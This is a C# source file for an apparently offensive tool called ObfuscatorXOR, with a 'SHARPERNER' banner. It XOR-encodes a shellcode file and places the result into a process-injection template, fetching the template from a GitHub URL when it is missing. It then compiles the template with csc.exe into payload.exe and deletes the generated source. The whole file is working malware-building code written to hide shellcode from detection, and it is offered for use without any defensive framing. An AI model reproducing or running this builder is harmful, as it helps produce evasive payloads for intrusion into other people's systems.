using System;
using System.Net;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Text.RegularExpressions;

namespace ObfuscatorXOR
{
    class Program
    {
        private static bool IsBase64String(string base64)
        {
            base64 = base64.Trim();
            return (base64.Length % 4 == 0) && Regex.IsMatch(base64, @"^[a-zA-Z0-9\+/]*={0,3}$", RegexOptions.None);
        }

        private static Random random = new Random();
        public static string RandomKey(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }

        private static byte[] xorEncDec(byte[] input, string theKeystring)
        {
            byte[] theKey = Encoding.UTF8.GetBytes(theKeystring);
            byte[] mixed = new byte[input.Length];
            for (int i = 0; i < input.Length; i++)
            {
                mixed[i] = (byte)(input[i] ^ theKey[i % theKey.Length]);
            }
            return mixed;
        }

        static byte[] Encrypt(string plainText, byte[] Key, byte[] IV)
        {
            byte[] encrypted;
            // Create a new AesManaged.    
            using (AesManaged aes = new AesManaged())
            {
                // Create encryptor    
                ICryptoTransform encryptor = aes.CreateEncryptor(Key, IV);
                // Create MemoryStream    
                using (MemoryStream ms = new MemoryStream())
                {
                    // Create crypto stream using the CryptoStream class. This class is the key to encryption    
                    // and encrypts and decrypts data from any given stream. In this case, we will pass a memory stream    
                    // to encrypt    
                    using (CryptoStream cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write))
                    {
                        // Create StreamWriter and write data to a stream    
                        using (StreamWriter sw = new StreamWriter(cs))
                            sw.Write(plainText);
                        encrypted = ms.ToArray();
                    }
                }
            }
            // Return encrypted data    
            return encrypted;
        }

        public static void banner()
        {
            string banner = @"
███████╗██╗  ██╗ █████╗ ██████╗ ██████╗ ███████╗██████╗ ███╗   ██╗███████╗██████╗ 
██╔════╝██║  ██║██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗████╗  ██║██╔════╝██╔══██╗
███████╗███████║███████║██████╔╝██████╔╝█████╗  ██████╔╝██╔██╗ ██║█████╗  ██████╔╝
╚════██║██╔══██║██╔══██║██╔══██╗██╔═══╝ ██╔══╝  ██╔══██╗██║╚██╗██║██╔══╝  ██╔══██╗
███████║██║  ██║██║  ██║██║  ██║██║     ███████╗██║  ██║██║ ╚████║███████╗██║  ██║
╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝

";
            Console.WriteLine(banner);
        }

        public static void help()
        {
            string help = @"
/file      shellcode file
/key      XOR Key (Optional)
";
            Console.WriteLine(help);
        }

        static void Main(string[] args)
        {
            string base64String = "";
            string xorKey = "Sup3rS3cur3K3yfTw!";
            string filePath;

            banner();

            var arguments = new Dictionary<string, string>();
            foreach (var argument in args)
            {
                var idx = argument.IndexOf(':');
                if (idx > 0)
                    arguments[argument.Substring(0, idx)] = argument.Substring(idx + 1);
                else
                    arguments[argument] = string.Empty;
            }

            if (arguments.Count == 0 || !arguments.ContainsKey("/file"))
            {
                Console.WriteLine("[!] Please Enter /file as argument");
                help();
            }
            else
            {
                filePath = arguments["/file"];

                if (!File.Exists(filePath)) //if file exists
                {
                    Console.WriteLine("[+] Missing input file");
                    Environment.Exit(0);
                }
                else
                {
                    base64String = File.ReadAllText(filePath);
                }

                if (arguments.ContainsKey("/key"))
                {
                     xorKey = arguments["/key"];
                }
                else
                {
                    Console.WriteLine($"[+] Using the default key: {xorKey}");
                }

                if (!IsBase64String(base64String))
                {
                    Console.WriteLine("[!] Make sure that it is a base64 string");
                }
                else
                {
                    byte[] xorEncString = xorEncDec(Convert.FromBase64String(base64String), xorKey); //XOR encrypt

                    string xorEncStringB64 = Convert.ToBase64String(xorEncString);

                    Console.WriteLine($"XOR encrypted text: {xorEncStringB64}");

                    //decrypt it back

                    //var decrypted = Convert.ToBase64String(xorEncDec((Convert.FromBase64String(xorEncStringB64)), xorKey));

                    //Console.WriteLine($"XOR decrypted text: {decrypted}");

                    // Write the file
                    string fullPath = Path.Combine(Directory.GetCurrentDirectory(), "payload.xor.b64");

                    using (StreamWriter writer = new StreamWriter(fullPath))
                    {
                        writer.WriteLine(xorEncStringB64);
                    }

                    // Open template file
                    var parentDir = Directory.GetParent(Directory.GetCurrentDirectory()).Parent.FullName;
                    var templateFile = Path.Combine(parentDir, "template.cs");
                    var outputFile = Path.Combine(Directory.GetCurrentDirectory(), "output.cs");

                    string templateFileContent = "";

                    // read all content
                    if (!File.Exists(templateFile)) //if file exists
                    {
                        Console.WriteLine("[!] File does not exists, fetching online...");
                        ServicePointManager.Expect100Continue = true;
                        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
                        WebClient client = new WebClient();
                        try
                        {
                            templateFileContent = client.DownloadString("https://raw.githubusercontent.com/aniqfakhrul/XORed-ProcessInjection/main/bin/Debug/template.cs");
                        }
                        catch
                        {
                            Console.WriteLine("[!] No internet connection");
                        }
                    }
                    else
                    {
                        templateFileContent = File.ReadAllText(templateFile);
                    }
                    // replace "string xoredB64" line
                    templateFileContent = templateFileContent.Replace("REPLACE SHELLCODE HERE", xorEncStringB64).Replace("REPLACE XORKEY",xorKey);
                    // write all back into the file
                    File.WriteAllText(outputFile, templateFileContent);

                    //compile the code
                    string strCmd = @"/c C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /out:payload.exe " + outputFile;
                    System.Diagnostics.Process.Start("CMD.exe", strCmd);

                    Console.WriteLine($"[+] Doing some cleaning...");
                    Thread.Sleep(1000);
                    File.Delete(outputFile);
                }
            }



        }


    }

}
